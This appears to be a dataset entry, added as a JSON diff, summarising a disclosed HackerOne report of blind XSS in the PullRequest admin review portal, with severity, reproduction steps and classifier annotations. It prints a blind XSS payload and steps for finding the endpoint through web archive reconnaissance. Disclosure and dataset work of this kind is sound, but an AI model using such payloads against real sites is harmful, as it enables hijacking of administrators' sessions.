@@ -1,0 +1,49 @@
+{
+  "reported_to": "HackerOne",
+  "reported_by": "bugra ",
+  "title": "Blind XSS in app.pullrequest.com/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 via /reviews/ratings/{uuid}",
+  "content": "\nSummary:\nHi,\nWhile researching PullRequest yesterday, I saw some \"review\" endpoints in web archive of \"app.pullrequest.com\". (http://web.archive.org/cdx/search/cdx?url=app.pullrequest.com/*&output=text&fl=original&collapse=urlkey)\nOne of them was https://app.pullrequest.com/reviews/ratings/6eaa6b75-b958-4530-ba46-0d00cbe74e0b/false , I went to that endpoint and filled the all fields with my blind XSS payload.\n'\"><img src=x id=\u2588\u2588\u2588\u2588\u2588 onerror=eval(atob(this.id))>\nThis payload sends an alert to my blind XSS application in \u2588\u2588\u2588\u2588\u2588\u2588\nToday (May 3, 2022, 6:09 pm UTC+3), I got a lot of alerts from https://app.pullrequest.com/\u2588\u2588\u2588. I checked the report and I see it came from an PullRequest admin who checks reviews.\nHere is a screenshot from the report :\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI checked the HTML source code and I see my payload reflected to Disliked_reviewers, Liked_reviewers and Reasons fields without any encoding.\nYou can also check the source code : \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nBlind XSS in PullRequest admin portal\nRegards,\nBugra\n\n",
+  "severity": [
+    8.8,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1653510480,
+  "report_url": "https://hackerone.com/reports/1558010",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Locate a review endpoint in the web archive of 'app.pullrequest.com' (e.g., https://app.pullrequest.com/reviews/ratings/6eaa6b75-b958-4530-ba46-0d00cbe74e0b/false)."
+    ],
+    [
+      2,
+      "Submit a blind XSS payload (e.g., '\"><img src=x id=\u2588\u2588\u2588\u2588\u2588 onerror=eval(atob(this.id))>') in all fields of the review form."
+    ],
+    [
+      3,
+      "Monitor the blind XSS application for alerts, indicating the payload was executed by an admin."
+    ]
+  ],
+  "vuln_description": "A blind XSS vulnerability exists in the PullRequest admin portal where user-supplied input in the review ratings form is reflected without proper encoding, allowing execution of arbitrary JavaScript when viewed by an admin.",
+  "reason": "The vulnerability involves straightforward exploitation of a reflected XSS payload in a web form, with no complex interactions or state manipulation required. The primary challenge was identifying the endpoint via web archive, which is a common reconnaissance technique.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The Blind XSS vulnerability involves injecting a payload that gets executed in an admin context, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing different user sessions and resource IDs for AuthN/AuthZ issues, not on detecting XSS vulnerabilities.",
+    "is_detectable": false
+  }
+}
